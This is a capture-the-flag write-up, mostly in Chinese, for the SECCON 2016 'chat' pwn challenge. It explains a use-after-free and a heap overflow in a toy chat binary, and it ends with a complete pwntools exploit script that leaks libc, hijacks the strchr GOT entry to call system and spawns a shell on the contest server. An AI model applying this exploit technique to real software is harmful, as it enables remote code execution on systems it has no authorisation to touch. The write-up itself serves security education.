---
title: '[SECCON CTF 2016 Quals] chat 500'
author: bruce30262
tags:
  - pwn
  - heap
  - Use After Free
  - heap overflow
  - SECCON CTF 2016
  - fastbin
  - GOT hijacking
categories:
  - write-ups
date: 2016-12-15 22:17:00
---
## Info  
> Category: pwn
> Point: 500
> Author: bruce30262 @ BambooFox


## Analyzing
64 bit ELF, Partial RELRO, 有 canary 和 NX , 沒 PIE.

程式是一個簡易的聊天程式，有點像 twitter :
```
$ ./chat
Simple Chat Service

1 : Sign Up     2 : Sign In
0 : Exit
menu > 1
name > userA
Success!

1 : Sign Up     2 : Sign In
0 : Exit
menu > 1
name > userB
Success!

1 : Sign Up     2 : Sign In
0 : Exit
menu > 2
name > userA
Hello, userA!
Success!

Service Menu

1 : Show TimeLine       2 : Show DM     3 : Show UsersList
4 : Send PublicMessage  5 : Send DirectMessage
6 : Remove PublicMessage                7 : Change UserName
0 : Sign Out
menu >> 5
name >> userB
message >> from a
Done.
```

我們可以註冊並登入 user，登入之後可以查看訊息，發 tweet ( public message ) 或是 DM 別人。上面的例子我們用 `userA` DM 了一條訊息給 `userB` ，之後我們登入 userB 並查看訊息 :
```
1 : Sign Up     2 : Sign In
0 : Exit
menu > 2
name > userB
Hello, userB!
Success!

Service Menu

1 : Show TimeLine       2 : Show DM     3 : Show UsersList
4 : Send PublicMessage  5 : Send DirectMessage
6 : Remove PublicMessage                7 : Change UserName
0 : Sign Out
menu >> 2
Direct Messages
[userA] from a
Done.
```
可以看到 `userB` 所擁有的 DM 都會顯示 sender 的名字與訊息內容

程式主要有兩個 data structure，用來存 user 和 message :
```c
struct user {
  char *name;
  struct message *msg;
  struct user *next_user;
}

struct message {
  int id ; // use in tweet (public message) only
  struct user *sender;
  char content[128];
  struct message *next_msg;
}
```

這邊要注意的是 user 的 name 有些限制。除了長度限制 32 byte 之外，**每個 name 的第一個字元還必須是 printable 的字元** ( 程式會用 [isprint](http://www.cplusplus.com/reference/cctype/isprint/) 函式來檢查 )

這樣的限制直接影響到了 `Change UserName` 這個功能。在更改 user name 的時候，如果程式發現 user name 的第一個字元不是 printable 的字元，程式會將這個 user 給 remove 掉。

所以如果我們先用 `userA` DM 一個訊息給 `userB`，然後將 `userA` 給 remove 掉的話，會發生什麼事呢?

```
1 : Sign Up     2 : Sign In
0 : Exit
menu > 2
name > userA
Hello, userA!
Success!

Service Menu

1 : Show TimeLine       2 : Show DM     3 : Show UsersList
4 : Send PublicMessage  5 : Send DirectMessage
6 : Remove PublicMessage                7 : Change UserName
0 : Sign Out
menu >> 7
name >>            <-- here we input '\t', which did not pass the isprint check
Change name error...
Bye, 

1 : Sign Up     2 : Sign In
0 : Exit
menu > 2
name > userB
Hello, userB!
Success!

Service Menu

1 : Show TimeLine       2 : Show DM     3 : Show UsersList
4 : Send PublicMessage  5 : Send DirectMessage
6 : Remove PublicMessage                7 : Change UserName
0 : Sign Out
menu >> 2
Direct Messages
[] from a       <-- strange sender's name
Done.
```
我們可以發現當我們查看 `userB` 的 DM 時，sender 的名字會怪怪的。這是因為我們已經將 `userA` 給 remove 掉了，導致 `userA->name` 這塊 buffer 被 free 掉，但是透過查看 `userB` 的 DM，我們還是有辦法去 access 到 這塊 buffer ( `userB->messsage->sender->name` )。因此，這是一個典型的 Use-After-Free 漏洞。

此外，在註冊一個 user 時，設定 user name 的時候程式會使用 `strdup()` 來配置一塊 buffer 給 `user->name`。如果我們設定 user name 的長度小於 24 的話，`strdup()` 會回給我們一個 size 為 `0x20` 的 memory chunk ( fastbin[0] )，此時這塊 buffer 最多只被允許輸入 24 個字元。但是在修改 user name 的時候，程式卻允許我們輸入最多  32 個字元，造成 heap overflow。 


## Exploit
首先是利用 UAF 來 leak 一些資訊。如果我們可以排一下 heap，使得其中一個 user ( ex. `userC` ) 的 name buffer 與 `userB->message->sender` 重疊的話 : 
```
                       +--------------+
userB->message->sender | char *p_name | userC->name
                       |              |
                       +----+---------+
                            |
            +---------------+
            |
            |          +-----------+
            +-> p_name |sender_name|
                       |    .      |
                       |    .      |
                       |    .      |
                       +-----------+

```
我們就可以透過修改 `userC->name` 的內容來去控制 `p_name` 這個 data pointer，之後透過查看 `userB` 的 DM 來去 leak 一些資訊。這部分只要對 fastbin 的 allocate 順序有些概念的話應該很快就可以排出來了。

排完之後我們就可以將 `p_name` 這個 pointer 改成 `__libc_start_main@got.plt` (`0x603040`，第一個字元 `0x40` 為 printable 字元所以可以更改成功 )，然後 leak 出 libc 的 base address。

接下來是任意寫。這部分就花了比較多的時間，主要是當時還沒有發現 heap overflow 的洞，能做的就是不斷地 fuzzing + 觀察 heap 的排列情形。直到排出下列的 heap 時才發現 name 那邊可以 overflow :
```
          +--------------+
0x1234050 |              | userC->name
          +--------------+
          |              |
          +--------------+
0x1234060 |              | unsortbin <-- oh yeah
          +--------------+
0x1234068 |          0x21|
          +--------------+
          |     .        |
          |     .        |
          |     .        |
          |     .        |
          |     .        |
0x1234090 |     0x1234050| userC
          |              |
          |              |
          |              |
          +--------------+
```

`0x1234060` 這個 chunk 位於 unsortbin 裡面，其 size 可以透過 overflow `userC->name` 來更改。如果我們將 size 改成 `0xa1` ( struct `message` 的大小 )，之後在 post message 的時候就可以透過控制 message 的內容來偽造 `userC` 這個 structure，把 `userC->name` 這個 pointer 改掉，之後透過修改 `userC` 的 name 來達到任意寫入。

總結一下如何達到任意寫 :
1. 排出上圖的 heap
2. overflow `userC->name`，將 unsortbin 中的 chunk size 從 `0x21` 改成 `0xa1`
3. 發布一個訊息，讓程式 allocate `0x1234060` 這個 chunk，之後控制訊息內容來偽造 `userC` 這個 structure (位於 `0x1234090`)
4. 將 `userC->name` 這個 pointer 改掉，改成任意 address，之後再透過修改 `userC` 的 name 來達到任意寫

有了任意寫就可以做 GOT hijacking 了。這題可以 hijack 的地方很多，有 `free`, `strcmp`, `strchr`, `atoi`......等等。

看起來似乎很容易，其實沒那麼簡單。前面有提到，如果要成功更改一個 user name，不管是舊 user name 還是新 user name，其第一個字元都必須是 printable 的字元。假設今天我們要 hijack free 的 GOT:
```
gdb-peda$ tel 0x603010
00:0000|  0x603010 --> 0x7eff900f44a0 (<_dl_runtime_resolve>:   sub    rsp,0x38)
01:0008|  0x603018 --> 0x7eff8fd9bd00 (<__GI___libc_free>:      mov    rax,QWORD PTR [rip+0x33b1e1]        # 0x7eff900d6ee8)
02:0016|  0x603020 --> 0x7eff8fda19b0 (<strlen>:        pxor   xmm8,xmm8)
03:0024|  0x603028 --> 0x4007f6 (<__stack_chk_fail@plt+6>:      push   0x2)
04:0032|  0x603030 --> 0x7eff8fd8b100 (<setbuf>:        mov    edx,0x2000)
05:0040|  0x603038 --> 0x7eff8fd9fd40 (<__strchr_sse2>: movd   xmm1,esi)
06:0048|  0x603040 --> 0x7eff8fd3ae50 (<__libc_start_main>:     push   r14)
07:0056|  0x603048 --> 0x7eff8fd87160 (<_IO_fgets>:     push   r12)
```

我們可以看到 free 的 GOT ( `0x603018` )，他存的 address 是 `0x7eff8fd9bd00`。其第一個字元是 `0x00`，不是 printable 的字元，因此在透過 `Change UserName` 更改 `free@got.plt` 的時候會失敗。就算今天 free 的 GOT 所存的 address 其第一個字元是 printable 的字元，但是這題 libc 的 `system` offset 為 `0x46590`，其第一個字元同樣不是 printable 的字元，這會讓程式認為新名字無效並嘗試去 free 掉 user name，導致程式 crash 掉 ( 嘗試去 free 掉一個 GOT entry 的關係 )。

那麼該如何繞過這項檢查呢 ? 個人覺得這邊還蠻有趣的。首先就是有發現到 `stack_chk_fail` 的 GOT 存的內容是 `0x4007f6`。雖然 `0xf6` 並非 printable 的字元，但是第三個字元 `0x40` 卻可以通過 `isprint` 的檢查。因此只要想辦法讓 `0x40` 成為舊 user name 的第一個字元就行了:
```
gdb-peda$ tel 0x60302a
00:0000|  0x60302a --> 0xb100000000000040 <-- printable first character !
01:0008|  0x603032 --> 0xfd4000007eff8fd8 
02:0016|  0x60303a --> 0xae5000007eff8fd9 
03:0024|  0x603042 --> 0x716000007eff8fd3 
04:0032|  0x60304a --> 0x8e0000007eff8fd8 
05:0040|  0x603052 --> 0xd2b000007eff8fe5 
06:0048|  0x60305a --> 0x86600007eff8fd6 
07:0056|  0x603062 --> 0x8e80000000000040
```
我們可以從 `0x60302a` 開始做寫入，前面先塞一些 printable 的字元填滿 `stack_chk_fail` 和 `setbuf` 的 GOT ( 這樣新 user name 的第一個字元也變成 printable 的了 ! )，之後再將 `system` 的 address 塞到 `strchr@got.plt` 裡面，即可成功 hijack `strchr` 的 GOT。

```python exp_chat.py
#!/usr/bin/env python

from pwn import *
import subprocess
import sys
import time

HOST = "chat.pwn.seccon.jp"
PORT = 26895
ELF_PATH = "./chat"
LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6" # ubuntu 14.04 64bit

# setting 
context.arch = 'amd64'
context.os = 'linux'
context.endian = 'little'
context.word_size = 32
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']

context.log_level = 'INFO'

elf = ELF(ELF_PATH)
libc = ELF(LIBC_PATH)

def signup(name):
    r.sendlineafter("> ", "1")
    r.sendlineafter("> ", name)

def signin(name):
    r.sendlineafter("> ", "2")
    r.sendlineafter("> ", name)

def tweet(msg):
    r.sendlineafter(">> ", "4")
    r.sendlineafter(">> ", msg)

def dm(user, msg):
    r.sendlineafter(">> ", "5")
    r.sendlineafter(">> ", user)
    r.sendlineafter(">> ", msg)

def signout():
    r.sendlineafter(">> ", "0")

def change_name(name):
    r.sendlineafter(">> ", "7")
    r.sendlineafter(">> ", name)

if __name__ == "__main__":

    r = remote(HOST, PORT)
    #r = process(ELF_PATH)

    signup("A"*4) # fastbin[0] * 2
    signup("B"*4) # fastbin[0] * 2
    signup("C"*30) # fastbin[0] * 1 + fastbin[1] * 1 

    signin("A"*4)
    tweet("aaaa") 
    signout()

    signin("B"*4)
    tweet("bbbb")
    dm("A"*4, "BA") # for creating dangling pointer
    dm("C"*30, "BC")
    signout()

    signin("C"*30)
    tweet("cccc")
    signout()

    signin("B"*4)
    change_name("\t") # invalid, will remove user (user AAAA's DM become dangling pointer)

    signin("C"*30)
    change_name("\t") 

    signup("d"*7)
    signin("d"*7)
    for i in xrange(6,2,-1): # null out the address
        change_name("d"*i)

    malusr = p64(elf.got['__libc_start_main'])
    change_name(malusr) # AAAA's DM's sender->name will pointer to __libc_start_main@got.plt
    signout()

    # leak libc
    signin("A"*4)
    r.sendlineafter(">> ", "2") # show DM, leak libc
    r.recvuntil("[")
    libc.address += u64(r.recv(6).ljust(8,"\x00")) - libc.symbols['__libc_start_main']
    system_addr = libc.symbols['system']

    log.success("libc base: "+hex(libc.address))
    log.success("system: "+hex(system_addr))
    signout()

    # overflow name buf and overwrite an unsortbin chunk's size
    # enlarge the size, so we can overflow the heap buffer and fake some data structure
    signin(malusr)
    change_name("i"*24+p8(0xa1)) # padding + fake size
    tweet("fuck") # will allocate chunk from smallbin
    change_name(p8(0x40)) # make this user into right index
    tweet("7"*16+p64(0x60302a)) # allocate chunk from unsortbin, overwrite data structure. We can now start overwriting memory from 0x60302a

    # start overwriting, we wish to overwrite strchr's got
    change_name("A"*6+"B"*8+p64(system_addr)) # padding + padding + strchr's got (overwrite to system)
    r.sendlineafter(">> ", "sh\x00") # strchr("sh", 10) --> system("sh")

    r.interactive()
```


flag: `SECCON{51mpl3_ch47_l1k3_7w1*73*}`
